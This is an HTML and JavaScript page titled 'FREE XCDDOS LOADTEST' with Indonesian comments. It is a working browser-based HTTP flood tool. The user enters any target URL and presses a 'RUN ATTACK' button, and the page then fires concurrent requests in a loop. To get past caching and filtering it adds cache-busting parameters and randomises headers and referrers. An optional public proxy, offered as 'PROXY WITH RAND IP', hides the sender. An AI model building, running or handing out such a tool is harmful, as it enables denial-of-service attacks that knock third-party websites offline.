
<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FREE XCDDOS LOADTEST</title>
<style>
        :root {
            --bg: #0d1117;
            --container: #161b22;
            --text: #c9d1d9;
            --primary: #238636;
            --accent: #58a6ff;
            --danger: #da3633;
            --warning: #d2a8ff;
            --error: #f85149;
            --info: #e3b341;
            --cors: #d2a8ff;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: var(--container);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 600px;
            border: 1px solid #30363d;
        }
        h2 { color: var(--accent); margin-top: 0; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 0.9em; }
        input, select {
            width: 100%;
            padding: 12px;
            background: var(--bg);
            border: 1px solid #30363d;
            border-radius: 6px;
            color: white;
            box-sizing: border-box;
            margin-bottom: 15px;
        }
        /* Grid diubah menjadi 3 kolom untuk menampung input Timeout */
        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .start-btn { background-color: var(--primary); color: white; }
        .start-btn:hover { background-color: #2ea043; }
        .stop-btn { background-color: var(--danger); color: white; display: none; }

        .stats-panel {
            margin-top: 25px;
            background: #000;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.95em;
        }
        .progress-container {
            background: #30363d;
            height: 10px;
            border-radius: 5px;
            margin: 15px 0;
            overflow: hidden;
        }
        #progress-bar {
            height: 100%;
            width: 0%;
            background: var(--accent);
            transition: 0.1s;
        }
        .stat-row { display: flex; justify-content: space-between; margin: 6px 0; border-bottom: 1px dashed #30363d; padding-bottom: 4px; }
        .stat-row:last-child { border-bottom: none; }
        .success { color: #3fb950; }
        .timeout-text { color: var(--warning); }
        .cors-text { color: var(--cors); }
        .error-text { color: var(--error); }
        .info-text { color: var(--info); }
        .status-badge { background: #30363d; padding: 2px 6px; border-radius: 4px; margin-left: 5px; font-size: 0.85em; display: inline-block; margin-bottom: 4px;}
</style>
  </head>
  <body>

        <div class="container">
          <h2>XCDDOS</h2>
          <div class="input-group">
        <label>URL Target</label>
        <input type="text" id="url" placeholder="https://example.com" oninput="saveData()">

        <label>Select Raw/Proxy (Opsional)</label>
        <select id="proxy" onchange="handleProxyChange()">
			<option value="" selected>RAW WITH YOUR IP</option>
            <option value="https://api.codetabs.com/v1/proxy?quest=">PROXY WITH RAND IP</option>
        </select>

        <div class="grid">
                  <div>
                        <label>Durasi (Detik)</label>
                        <input type="number" id="duration" value="30" oninput="saveData()">
                  </div>
                  <div>
                        <label>Threads</label>
                        <input type="number" id="threads" value="10">
                  </div>
                  <div>
                        <label>Timeout (ms)</label>
                        <input type="number" id="timeout-ms" value="2000" oninput="saveData()">
                  </div>
        </div>
          </div>

          <button id="start-btn" class="start-btn" onclick="startTest()">RUN ATTACK</button>
          <button id="stop-btn" class="stop-btn" onclick="stopTest()">STOP</button>

          <div class="stats-panel">
        <div class="stat-row">
                  <span>Status:</span>
                  <span id="status">Ready</span>
        </div>
        <div class="progress-container">
                  <div id="progress-bar"></div>
        </div>
        <div class="stat-row">
                  <span>Target IP:</span>
                  <span id="target-ip" class="info-text">Menunggu...</span>
        </div>
        <div class="stat-row">
                  <span>Total Requests:</span>
                  <span id="total-req">0</span>
        </div>
            <div class="stat-row">
                <span>X-Fetch-Mode:</span>
                <span id="fetch_mode_ui" class="info-text">kosong</span>
            </div>
        <div class="stat-row">
                  <span>Request Terkirim (Berhasil):</span>
                  <span id="req-terkirim" class="success">0</span>
        </div>
        <div class="stat-row">
                  <span>Request Gagal (Ke Target):</span>
                  <span id="req-gagal" class="error-text">0</span>
        </div>
        <div class="stat-row">
                  <span>Origin Hits:</span>
                  <span id="origin-hits" class="success">0</span>
        </div>
        <div class="stat-row">
                  <span>Timeouts:</span>
                  <span id="timeouts" class="timeout-text">0</span>
        </div>
        <div class="stat-row">
                  <span>CORS Errors:</span>
                  <span id="cors-errors" class="cors-text">0</span>
        </div>
        <div class="stat-row">
                  <span>Local Errors:</span>
                  <span id="local-errors" class="error-text">0</span>
        </div>
        <div class="stat-row" style="flex-direction: column; align-items: flex-start;">
                  <span style="margin-bottom: 5px;">HTTP Status Codes:</span>
                  <div id="http-statuses" style="display: flex; flex-wrap: wrap; gap: 5px;">-</div>
        </div>
        <div class="stat-row" style="margin-top: 10px;">
                  <span>Waktu Tersisa:</span>
                  <span id="timer">0s</span>
        </div>
          </div>
        </div>

<script>
    let isRunning = false;
    let requestCount = 0;
    let originHits = 0;
    let timeoutCount = 0;
    let corsErrors = 0;
    let localErrors = 0;
    let stopTime = 0;
    let statusCodes = {};

    const referrers = [
        'https://www.google.com/',
        'https://www.facebook.com/',
        'https://t.co/',
        'https://www.bing.com/',
        'https://www.cloudflare.com/', 
		'https://edge.nyc.mn/'
    ];
const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const menerima = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    ];
  const encoding = [
        'gzip, deflate, br',
        'gzip, br',
        'deflate',
        'gzip, deflate, br, zstd',
        'gzip, deflate, lzma, sdch',
        'deflate',
        'identity'
    ];
	const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
    window.onload = function() {
        if(localStorage.getItem('targetUrl')) {
            document.getElementById('url').value = localStorage.getItem('targetUrl');
        }
        if(localStorage.getItem('testDuration')) {
            document.getElementById('duration').value = localStorage.getItem('testDuration');
        }
        if(localStorage.getItem('proxySelection')) {
            document.getElementById('proxy').value = localStorage.getItem('proxySelection');
        }
        // Load data timeout jika ada
        if(localStorage.getItem('timeoutMs')) {
            document.getElementById('timeout-ms').value = localStorage.getItem('timeoutMs');
        }
    };

    function saveData() {
        localStorage.setItem('targetUrl', document.getElementById('url').value);
        localStorage.setItem('testDuration', document.getElementById('duration').value);
        localStorage.setItem('proxySelection', document.getElementById('proxy').value);
        // Simpan data timeout
        localStorage.setItem('timeoutMs', document.getElementById('timeout-ms').value);
    }
    // FITUR BARU: Handle perubahan Proxy untuk Auto Threads
    function handleProxyChange() {
        saveData();
        const proxyValue = document.getElementById('proxy').value;
        const threadsInput = document.getElementById('threads');
        const waktunya = document.getElementById('timeout-ms');
        // Jika menggunakan CodeTab, otomatis set Threads ke 50
        if (proxyValue.includes('codetabs')) {
            threadsInput.value = 50;
            waktunya.value = 12000;
        } else {
            // Jika tanpa proxy, kembalikan ke default (misal 10)
            threadsInput.value = 100;
            waktunya.value = 15000;
        }
    }
    async function resolveTargetIP(targetUrl) {
        try {
            document.getElementById('target-ip').innerText = "Resolving...";
            const urlObj = new URL(targetUrl);
            const hostname = urlObj.hostname;

            const res = await fetch(`https://dns.google/resolve?name=${hostname}&type=A`);
            const data = await res.json();

            if (data.Answer && data.Answer.length > 0) {
                document.getElementById('target-ip').innerText = data.Answer[0].data;
            } else {
                document.getElementById('target-ip').innerText = "IP Tidak Ditemukan";
            }
        } catch (e) {
            document.getElementById('target-ip').innerText = "Gagal Resolve IP";
        }
    }

    function updateStatusCodesUI() {
        const container = document.getElementById('http-statuses');
        if (Object.keys(statusCodes).length === 0) {
            container.innerHTML = '-';
            return;
        }

        let html = '';
        for (const [code, count] of Object.entries(statusCodes)) {
            let color = '#3fb950'; // Hijau untuk 2xx
            const codeStr = String(code);

            if (codeStr.startsWith('3')) color = '#e3b341';
            else if (codeStr.startsWith('4')) color = '#f85149';
            else if (codeStr.startsWith('5')) color = '#da3633';
            else if (codeStr === 'CORS Blocked') color = '#d2a8ff';

            html += `<span class="status-badge" style="color: ${color}; border: 1px solid ${color};">${code}: ${count}</span>`;
        }
        container.innerHTML = html;
    }

    // Fungsi untuk mengupdate total gagal
    function updateGagalUI() {
        const totalGagal = timeoutCount + corsErrors + localErrors;
        document.getElementById('req-gagal').innerText = totalGagal.toLocaleString();
    }

    async function sendRequest(url) {
        if (!isRunning || Date.now() > stopTime) return;

        const proxyUrl = document.getElementById('proxy').value;

        const finalUrl = proxyUrl ? proxyUrl + url : url;

        const dynamicUrl = finalUrl + (finalUrl.includes('?') ? '&' : '?') + 'cb=' + Math.random().toString(36).substring(7);
        const randomLang = language_header[Math.floor(Math.random() * language_header.length)];
        const randomMenerima = menerima[Math.floor(Math.random() * menerima.length)];
        const randomEncoding = encoding[Math.floor(Math.random() * encoding.length)];
		const pilih = proxyUrl ? fetch_mode[3] : fetch_mode[2];
    document.getElementById('fetch_mode_ui').innerText = pilih;
        // Optimistic Tracking: Total Request selalu dihitung SEBELUM difetch/diblokir
        if (isRunning) {
            requestCount++;
            document.getElementById('total-req').innerText = requestCount.toLocaleString();
        }

        try {
            const controller = new AbortController();
            // Ambil value dari input Timeout, fallback ke 2000 jika kosong
            const timeoutValue = parseInt(document.getElementById('timeout-ms').value) || 2000;
            const timeoutId = setTimeout(() => controller.abort(), timeoutValue);
            
          const headers = {
                    'Accept-Language': randomLang, // Memasukkan variabel randomUA yang sebelumnya tidak terpakai
                    'Accept': randomMenerima, // ini yang aku benarkan
                    'Accept-Encoding': randomEncoding
                };
            const response = await fetch(dynamicUrl, {
                method: 'GET',
                cache: 'no-store', 
				mode: pilih,
                headers: headers,
			    keepalive: true,
                referrer: referrers[Math.floor(Math.random() * referrers.length)],
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (isRunning) {
                originHits++;
                const status = response.status;
                statusCodes[status] = (statusCodes[status] || 0) + 1;

                document.getElementById('origin-hits').innerText = originHits.toLocaleString();
                document.getElementById('req-terkirim').innerText = originHits.toLocaleString(); // Update Terkirim
                updateStatusCodesUI();
            }
        } catch (e) {
            if (e.name === 'AbortError') {
                if (isRunning) {
                    timeoutCount++;
                    document.getElementById('timeouts').innerText = timeoutCount.toLocaleString();
                    updateGagalUI(); // Update Gagal
                }
            } else if (e.name === 'TypeError') {
                // Modifikasi: Cek apakah jaringan user terputus
                if (!navigator.onLine) {
                    if (isRunning) {
                        localErrors++; // Dihitung sebagai kegagalan koneksi jaringan lokal
                        document.getElementById('local-errors').innerText = localErrors.toLocaleString();
                        updateGagalUI();
                    }
                } else {
                    // TypeError pada Fetch biasanya disebabkan oleh kebijakan CORS Browser.
                    // Request tetap menyentuh server target, jadi Origin Hits ditambahkan.
                    if (isRunning) {
                       // originHits++;
                        corsErrors++;

                        //document.getElementById('origin-hits').innerText = originHits.toLocaleString();
                        document.getElementById('cors-errors').innerText = corsErrors.toLocaleString();

                        statusCodes['CORS Blocked'] = (statusCodes['CORS Blocked'] || 0) + 1;
                        updateStatusCodesUI();
                        updateGagalUI(); // Update Gagal
                    }
                }
            } else {
                // Error lainnya dihitung murni sebagai Local Error
                if (isRunning) {
                    localErrors++;
                    document.getElementById('local-errors').innerText = localErrors.toLocaleString();
                    updateGagalUI(); // Update Gagal
                }
            }
        }

        if (isRunning) {
            const jitter = Math.floor(Math.random() * 10);
            setTimeout(() => sendRequest(url), jitter);
        }
    }

    function startTest() {
        const targetUrl = document.getElementById('url').value;
        const duration = parseInt(document.getElementById('duration').value);
        const threads = parseInt(document.getElementById('threads').value);

        if (!targetUrl.startsWith('http')) {
            alert('Masukkan URL yang valid (harus memakai http:// atau https://)');
            return;
        }

        isRunning = true;
        requestCount = 0;
        originHits = 0;
        timeoutCount = 0;
        corsErrors = 0;
        localErrors = 0;
        statusCodes = {};
        stopTime = Date.now() + (duration * 1000);

        document.getElementById('start-btn').style.display = 'none';
        document.getElementById('stop-btn').style.display = 'block';
        document.getElementById('status').innerText = 'Running...';
        document.getElementById('status').style.color = '#3fb950';
        document.getElementById('total-req').innerText = '0';
        document.getElementById('origin-hits').innerText = '0';
        document.getElementById('timeouts').innerText = '0';
        document.getElementById('cors-errors').innerText = '0';
        document.getElementById('local-errors').innerText = '0';

        // Reset statistik baru
        document.getElementById('req-terkirim').innerText = '0';
        document.getElementById('req-gagal').innerText = '0';

        updateStatusCodesUI();

        // Panggil fungsi resolve IP sebelum memulai threads
        resolveTargetIP(targetUrl);

        for (let i = 0; i < threads; i++) {
            sendRequest(targetUrl);
        }

        const startTime = Date.now();
        const timerInterval = setInterval(() => {
            const now = Date.now();
            const elapsed = now - startTime;
            const remaining = Math.max(0, Math.ceil((stopTime - now) / 1000));
            const progress = (elapsed / (duration * 1000)) * 100;

            document.getElementById('timer').innerText = remaining + 's';
            document.getElementById('progress-bar').style.width = Math.min(progress, 100) + '%';

            if (now > stopTime || !isRunning) {
                clearInterval(timerInterval);
                stopTest();
            }
        }, 100);
    }

    function stopTest() {
        isRunning = false;
        document.getElementById('start-btn').style.display = 'block';
        document.getElementById('stop-btn').style.display = 'none';
        document.getElementById('status').innerText = 'Finished';
        document.getElementById('status').style.color = '#c9d1d9';
    }
</script>

  </body>
</html>
